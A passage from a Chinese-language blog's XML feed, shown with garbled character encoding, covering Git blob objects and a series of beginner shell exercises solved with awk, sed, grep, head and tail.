ä¿å­˜äº†æŒ‡å‘Gitå¯¹è±¡çš„å¼•ç”¨ã€‚å‡†ç¡®åœ°è¯´ï¼Œè¿™ä¸ªå¼•ç”¨æ‰€æŒ‡å‘çš„ï¼Œæ˜¯ä¸åˆ†æ”¯ï¼Œæ ‡ç­¾ï¼Œè¿œç¨‹åº“ç­‰ç›¸å…³è”çš„commitå¯¹è±¡ã€‚GitæŠŠå®ƒæ‰€ç®¡ç†çš„å¯¹è±¡åˆ†æˆäº†å‡ ç§ç±»å‹ï¼Œcommitå¯¹è±¡å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚å…³äºcommitå¯¹è±¡ï¼Œå¼•ç”¨ï¼Œä»¥åŠrefsç›®å½•ï¼Œåé¢æˆ‘ä»¬è¿˜ä¼šè¯¦ç»†ä»‹ç»ï¼›</li><li>HEAD: è¿™ä¸ªå¾ˆå®¹æ˜“ç†è§£ï¼Œå®ƒä¿å­˜äº†å½“å‰åˆ†æ”¯çš„headæŒ‡é’ˆï¼Œå®é™…ä¸Šå°±æ˜¯æŒ‡å‘å½“å‰åˆ†æ”¯æœ€æ–°æäº¤ï¼ˆä¹Ÿæ˜¯ä¸€ä¸ªcommitå¯¹è±¡ï¼‰çš„å¼•ç”¨ã€‚<h2 id="Blobå¯¹è±¡"><a href="#Blobå¯¹è±¡" class="headerlink" title="Blobå¯¹è±¡"></a>Blobå¯¹è±¡</h2>é¦–å…ˆæ‰‹å·¥åˆ›å»ºä¸€ä¸ªGitå¯¹è±¡ï¼Œç°åœ¨å°±è®©æˆ‘ä»¬åˆ©ç”¨git hash-objectï¼Œæ‰‹å·¥æŠŠä¸€ä¸ªæ–°å»ºçš„æ–‡ä»¶å­˜å…¥Gitåº“ï¼š<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;Inside Git&#x27; &gt; README</span><br><span class="line">$ git hash-object -w README</span><br><span class="line">968b2bf72e28d8c6756054730880cf9f9ab06062</span><br></pre></td></tr></table></figure>æ­¤æ—¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°åœ¨.gitç›®å½•çš„objectså­ç›®å½•ä¸‹å¤šäº†ä¸€ä¸ªæ–°æ–‡ä»¶ã€‚æ–‡ä»¶åå’Œä¸Šçº§ç›®å½•åç§°çš„ç»„åˆåˆšå¥½æ„æˆäº†git hash-objectè¿”å›çš„å”¯ä¸€é”®ï¼š<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find .git/objects -type f</span><br><span class="line">.git/objects/96/8b2bf72e28d8c6756054730880cf9f9ab06062</span><br></pre></td></tr></table></figure>å¦‚æœåœ¨æ‰§è¡Œgit cat-fileå‘½ä»¤æ—¶ä½¿ç”¨-tå‚æ•°ï¼Œæˆ‘ä»¬è¿˜èƒ½çœ‹åˆ°Gitå¯¹è±¡çš„æ‰€å±ç±»å‹ï¼š<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git cat-file -t 8b2bf72e28d8c6756054730880cf9f9ab06062</span><br><span class="line">blob</span><br></pre></td></tr></table></figure>å¯ä»¥çœ‹åˆ°ï¼Œ<strong>ä¸æ–‡ä»¶ç›¸å¯¹åº”çš„Gitå¯¹è±¡éƒ½æ˜¯blobç±»å‹çš„</strong>ã€‚å¾ˆå¿«æˆ‘ä»¬å°±ä¼šçœ‹åˆ°ï¼Œé™¤äº†blobå¯¹è±¡ï¼ŒGitè¿˜æ”¯æŒå¾ˆå¤šå…¶ä»–ç±»å‹çš„å¯¹è±¡ã€‚<br>å¥½äº†ï¼Œä»Šå¤©å°±å…ˆåˆ°è¿™é‡Œå•¦ã€‚åœ¨ä¸‹ç¯‡æ–‡ç« é‡Œï¼Œæˆ‘ä»¬å°†è®¨è®ºGitä¸­çš„å¦å¤–ä¸¤ç§é‡è¦çš„å¯¹è±¡ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ï¼šTreeå’ŒCommitï¼</li></ul><blockquote><p><a href="https://morningspace.github.io/tech/inside-git-1/">https://morningspace.github.io/tech/inside-git-1/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹ç»Ÿè®¡æ‰€æœ‰è¿›ç¨‹å ç”¨å†…å­˜å¤§å°çš„å’Œ</title>
      <link href="/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%92%8C/"/>
      <url>/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%89%80%E6%9C%89%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8%E5%86%85%E5%AD%98%E5%A4%A7%E5%B0%8F%E7%9A%84%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root         2  0.0  0.0      0     0 ?        S    9æœˆ25   0:00 [kthreadd]</span><br><span class="line">root         4  0.0  0.0      0     0 ?        I&lt;   9æœˆ25   0:00 [kworker/0:0H]</span><br><span class="line">web       1638  1.8  1.8 6311352 612400 ?      Sl   10æœˆ16  21:52 test</span><br><span class="line">web       1639  2.0  1.8 6311352 612401 ?      Sl   10æœˆ16  21:52 test</span><br><span class="line">tangmiao-pc       5336   0.0  1.4  9100240 238544   ??  S     3:09ä¸‹åˆ   0:31.70 /Applications</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šå†…å®¹æ˜¯é€šè¿‡ps aux | grep -v â€˜RSS TTYâ€™ å‘½ä»¤è¾“å‡ºåˆ°nowcoder.txtæ–‡ä»¶ä¸‹é¢çš„<br>è¯·ä½ å†™ä¸€ä¸ªè„šæœ¬è®¡ç®—ä¸€ä¸‹æ‰€æœ‰è¿›ç¨‹å ç”¨å†…å­˜å¤§å°çš„å’Œ:</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>1ã€</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum=0</span><br><span class="line">    for i in `awk &#x27;&#123;print $6&#125;&#x27; nowcoder.txt`</span><br><span class="line">    do</span><br><span class="line">        ((sum+=$i))</span><br><span class="line">        done</span><br><span class="line">    echo $sum  </span><br></pre></td></tr></table></figure><p>æ­¤å¤„åˆ©ç”¨forå¾ªç¯ï¼Œç”¨å˜é‡iæ¥æ¥æ”¶nowcoder.txtæ–‡ä»¶æ¯ä¸€è¡Œå¯¹åº”çš„æ•°æ®ï¼Œåˆ©ç”¨awkå¯¹æ¯ä¸€è¡Œæ•°æ®è¿›è¡Œåˆ‡å‰²ï¼Œè¾“å‡ºç¬¬6å¿«åŒºåŸŸçš„æ•°æ®ä¿¡æ¯<br>2ã€</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sum=0</span><br><span class="line">while read p</span><br><span class="line">    do</span><br><span class="line">        ((sum+=<span class="variable">$(echo $p|awk &#x27;&#123;print $6&#125;&#x27;)</span>));        </span><br><span class="line">    done &lt; nowcoder.txt</span><br><span class="line">echo $sum</span><br></pre></td></tr></table></figure><p>é€šè¿‡readå‘½ä»¤æ¥è¯»å†™æ•°æ®ï¼Œå˜é‡pè¡¨ç¤ºæ‰€è¯»å–çš„æ¯ä¸€è¡Œçš„æ•°æ®ï¼ŒåŒæ—¶é€šè¿‡ç®¡é“å‘½ä»¤ä¸awkå‘½ä»¤ç»“åˆæŸ¥è¯¢ï¼Œå¾—åˆ°æ¯è¡Œçš„ç¬¬6å¿«åŒºåŸŸçš„æ•°æ®ä¿¡æ¯ã€‚<br>3ã€</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;sum+=$6&#125;END&#123;print sum&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure><p>3å’Œ4è§£æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯åˆ©ç”¨awkçš„å¼ºå¤§åŠŸèƒ½ï¼Œç”±ç¬¬ä¸€è¡Œå¼€å§‹è¯»å†™ï¼Œè¯»åˆ°æœ€åä¸€è¡Œç»“æŸ<br>4ã€</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN&#123;sum=0&#125;&#123;sum+=$6&#125;END&#123;print sum&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure><p>5ã€ã€Šæ€§èƒ½æœ€ä½³ã€‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sum=0;</span><br><span class="line">while read p</span><br><span class="line">do</span><br><span class="line">    arr=($p)</span><br><span class="line">    ((sum+=arr[5]))</span><br><span class="line">done &lt;nowcoder.txt</span><br><span class="line">echo $sum</span><br></pre></td></tr></table></figure><p>æ­¤ç±»è§£æ³•æœªä½¿ç”¨awkå‘½ä»¤ï¼Œä¸ºæ€§èƒ½æœ€ä½³ï¼Œé€šè¿‡å®šä¹‰æ•°ç»„æ¥æ”¶æ¯è¡Œçš„æ•°æ®ï¼Œarr[5]åˆ™è¡¨ç¤ºç¬¬5å—åŒºåŸŸçš„æ•°æ®ä¿¡æ¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹ç»Ÿè®¡æ¯ä¸ªå•è¯å‡ºç°çš„ä¸ªæ•°</title>
      <link href="/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E5%8D%95%E8%AF%8D%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%AA%E6%95%B0/"/>
      <url>/2022/04/11/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E5%8D%95%E8%AF%8D%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%AA%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬ä»¥ç»Ÿè®¡ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ nowcoder.txt ä¸­æ¯ä¸ªå•è¯å‡ºç°çš„ä¸ªæ•°ã€‚</p><p>ä¸ºäº†ç®€å•èµ·è§ï¼Œä½ å¯ä»¥å‡è®¾ï¼š<br>nowcoder.txtåªåŒ…æ‹¬å°å†™å­—æ¯å’Œç©ºæ ¼ã€‚<br>æ¯ä¸ªå•è¯åªç”±å°å†™å­—æ¯ç»„æˆã€‚<br>å•è¯é—´ç”±ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼å­—ç¬¦åˆ†éš”ã€‚</p><p>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">welcome nowcoder</span><br><span class="line">welcome to nowcoder</span><br><span class="line">nowcoder</span><br></pre></td></tr></table></figure><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼ˆä»¥è¯é¢‘å‡åºæ’åˆ—ï¼‰ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">to 1 </span><br><span class="line">welcome 2 </span><br><span class="line">nowcoder 3 </span><br></pre></td></tr></table></figure><p>è¯´æ˜:<br>ä¸è¦æ‹…å¿ƒä¸ªæ•°ç›¸åŒçš„å•è¯çš„æ’åºé—®é¢˜ï¼Œæ¯ä¸ªå•è¯å‡ºç°çš„ä¸ªæ•°éƒ½æ˜¯å”¯ä¸€çš„ã€‚</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ³¨æ„ awk æ˜¯ä¸€è¡Œä¸€è¡Œå¤„ç†çš„</span></span><br><span class="line"><span class="comment">#a[] å¯ä»¥ç†è§£æˆæ˜¯ä¸ªmap</span></span><br><span class="line"><span class="comment">#NFæ˜¯æ¯è¡Œæœ‰å‡ ä¸ªåŸŸ</span></span><br><span class="line"><span class="comment">#$i æ˜¯å–è¿™ä¸€è¡Œçš„ç¬¬iä¸ªå€¼</span></span><br><span class="line"><span class="comment"># ENDæ˜¯æŒ‡æœ€åæ‰§è¡Œçš„æ„æ€</span></span><br><span class="line">awk &#x27;&#123;for(i=1;i&lt;=NF;i++) a[$i]+=1&#125;END&#123;for(x in a) print x,a[x]&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹æ‰“å°å­—æ¯æ•°å°äº8çš„å•è¯</title>
      <link href="/2022/04/09/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%B0%8F%E4%BA%8E8%E7%9A%84%E5%8D%95%E8%AF%8D/"/>
      <url>/2022/04/09/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%B0%8F%E4%BA%8E8%E7%9A%84%E5%8D%95%E8%AF%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬ä»¥ç»Ÿè®¡ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ nowcoder.txtä¸­å­—æ¯æ•°å°äº8çš„å•è¯ã€‚</p><p>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š<br>how they are implemented and applied in computer </p><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">how</span><br><span class="line">they</span><br><span class="line">are</span><br><span class="line">and</span><br><span class="line">applied</span><br><span class="line">in</span><br></pre></td></tr></table></figure><p>è¯´æ˜:<br>ä¸è¦æ‹…å¿ƒä½ è¾“å‡ºçš„ç©ºæ ¼ä»¥åŠæ¢è¡Œçš„é—®é¢˜</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ç”¨ç©ºæ ¼è¿›è¡Œåˆ†å‰²ï¼ŒNFæ˜¯å½“å‰è®°å½•çš„å­—æ®µæ•°ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯å•è¯æ•°;<br>ç„¶åforå¾ªç¯åµŒå¥—ifåˆ¤æ–­;<br>å½“å½“å‰å­—æ®µçš„é•¿åº¦å°äº8æ—¶ï¼Œå°†å…¶æ‰“å°å‡ºæ¥;</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F<span class="string">&quot; &quot;</span> &#x27;&#123;for(i=1;i&lt;=NF;i++)&#123;if(length($i) &lt; 8)&#123;print $i&#125;&#125;&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹å»æ‰ç©ºè¡Œ</title>
      <link href="/2022/04/07/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E5%8E%BB%E6%8E%89%E7%A9%BA%E8%A1%8C/"/>
      <url>/2022/04/07/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E5%8E%BB%E6%8E%89%E7%A9%BA%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬ä»¥å»æ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ nowcoder.txtä¸­çš„ç©ºè¡Œ<br>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">abc</span><br><span class="line"></span><br><span class="line">567</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ccc</span><br></pre></td></tr></table></figure><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc</span><br><span class="line">567</span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br></pre></td></tr></table></figure><h2 id="é¢˜è§£-å»æ‰ç©ºè¡Œ"><a href="#é¢˜è§£-å»æ‰ç©ºè¡Œ" class="headerlink" title="é¢˜è§£ | #å»æ‰ç©ºè¡Œ#"></a>é¢˜è§£ | #å»æ‰ç©ºè¡Œ#</h2><h3 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>awk å‘½ä»¤ï¼Œåˆ¤æ–­å½“å‰è¡Œçš„å†…å®¹ç„¶åè¾“å‡º<br><code>awk &#39;&#123;if($0 != &quot;&quot;) &#123;print $0&#125;&#125;&#39; ./nowcoder.txt</code><br><code>awk &#39;!/^$/ &#123;print $NF&#125;&#39;</code><br>æˆ–è€…<br><code>awk &#39;!/^$/ &#123;print $0&#125;&#39;</code></p><h3 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>cat è¾“å‡ºæ–‡æœ¬å†…å®¹ï¼Œç„¶åé€šè¿‡ç®¡é“ç¬¦äº¤ç”± awk åšéç©ºæ ¡éªŒç„¶åè¾“å‡º<br><code>cat ./nowcoder.txt | awk NF</code></p><h3 id="æ–¹æ³•3"><a href="#æ–¹æ³•3" class="headerlink" title="æ–¹æ³•3"></a>æ–¹æ³•3</h3><p>grep å‘½ä»¤</p><ol><li>-v æ˜¾ç¤ºä¸åŒ…å«åŒ¹é…æ–‡æœ¬çš„æ‰€æœ‰è¡Œ</li></ol><p><code>cat ./nowcoder.txt | awk NF</code></p><ol start="2"><li>-e æŒ‡å®šå­—ç¬¦ä¸²åšä¸ºæŸ¥æ‰¾æ–‡ä»¶å†…å®¹çš„æ ·å¼</li></ol><p><code>grep -e &#39;\S&#39;</code><br>æˆ–è€…<br><code>grep  &#39;\S&#39;</code></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹æ‰“å°ç©ºè¡Œçš„è¡Œå·</title>
      <link href="/2022/04/06/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E7%A9%BA%E8%A1%8C%E7%9A%84%E8%A1%8C%E5%8F%B7/"/>
      <url>/2022/04/06/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E6%89%93%E5%8D%B0%E7%A9%BA%E8%A1%8C%E7%9A%84%E8%A1%8C%E5%8F%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬ä»¥è¾“å‡ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ nowcoder.txtä¸­ç©ºè¡Œçš„è¡Œå·,å¯èƒ½è¿ç»­,ä»1å¼€å§‹<br>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f</span><br></pre></td></tr></table></figure><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></table></figure><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><ul><li>grepåŒ¹é…ç©ºè¡Œï¼Œawkå»æ‰å†’å·</li></ul><p><code>grep -n &#39;^$&#39; nowcoder.txt | awk -F: &#39;&#123;print $1&#125;&#39;</code></p><ul><li><strong>awkæ­£åˆ™åŒ¹é…ç©ºè¡Œ,ç„¶åå‘¢è¾“å‡ºè¡Œæ•°</strong></li></ul><p><code>**awk &#39;/^$/&#123;print NR&#125;&#39; nowcoder.txt**</code><br>/^$/ä¹‹é—´å†™æ­£åˆ™è¡¨è¾¾å¼</p><ul><li>sedæ­£åˆ™åŒ¹é…ç©ºè¡Œï¼Œ=è¾“å‡ºè¡Œæ•°</li></ul><p><code>sed -n &#39;/^$/=&#39; nowcoder.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹è¾“å‡ºç¬¬5è¡Œçš„å†…å®¹</title>
      <link href="/2022/04/05/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA%E7%AC%AC5%E8%A1%8C%E7%9A%84%E5%86%85%E5%AE%B9/"/>
      <url>/2022/04/05/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA%E7%AC%AC5%E8%A1%8C%E7%9A%84%E5%86%85%E5%AE%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬ä»¥è¾“å‡ºä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ nowcoder.txt ä¸­ç¬¬5è¡Œçš„å†…å®¹ã€‚<br>ç¤ºä¾‹:<br>å‡è®¾ nowcoder.txt å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">welcome</span><br><span class="line">to</span><br><span class="line">nowcoder</span><br><span class="line">this</span><br><span class="line">is</span><br><span class="line">shell</span><br><span class="line">code</span><br></pre></td></tr></table></figure><p>ä½ çš„è„šæœ¬åº”å½“è¾“å‡ºï¼š<br>is</p><h2 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h2><p>head å‘½ä»¤æ‹¿åˆ°å‰äº”è¡Œï¼Œå†é€šè¿‡é€šé“ï¼Œé€šè¿‡tailå–å‡ºæ¥æœ€åä¸€è¡Œï¼Œå³ç¬¬äº”è¡Œ</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 5 nowcoder.txt | tail -n 1</span><br></pre></td></tr></table></figure><h2 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h2><p>sed å‘½ä»¤ä¸­çš„ p å­å‘½ä»¤ï¼Œæ‰“å°ç¬¬äº”è¡Œ</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n &#x27;5p&#x27;</span><br></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>head ä»å¤´å¼€å§‹æ‰“å°ï¼Œtail ä»æœªå¼€å§‹æ‰“å°ï¼Œsed ä»ä¸­é—´å¼€å§‹æ‰“å°</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellç³»åˆ—é¢˜ä¹‹è¾“å‡º7çš„å€æ•°</title>
      <link href="/2022/04/04/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA7%E7%9A%84%E5%80%8D%E6%95%B0/"/>
      <url>/2022/04/04/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E8%BE%93%E5%87%BA7%E7%9A%84%E5%80%8D%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>å†™ä¸€ä¸ª bashè„šæœ¬ä»¥è¾“å‡ºæ•°å­— 0 åˆ° 500 ä¸­ 7 çš„å€æ•°(0 7 14 21â€¦)çš„å‘½ä»¤</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><ul><li>æ­£å‘</li></ul><ol><li>ä»0æ•°åˆ°500</li><li>æ¯ä¸ªæ•°å­—å¯¹7è¿›è¡Œå–æ¨¡ã€‚å¦‚æœ%7=0ï¼Œåˆ™è¡¨ç¤ºä¸ºå€æ•°</li></ol><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!bin/bash</span></span><br><span class="line">num=0</span><br><span class="line">while (( $num&lt;=500 ))</span><br><span class="line">do</span><br><span class="line">if (( $num%7==0 ))</span><br><span class="line">then</span><br><span class="line">    echo 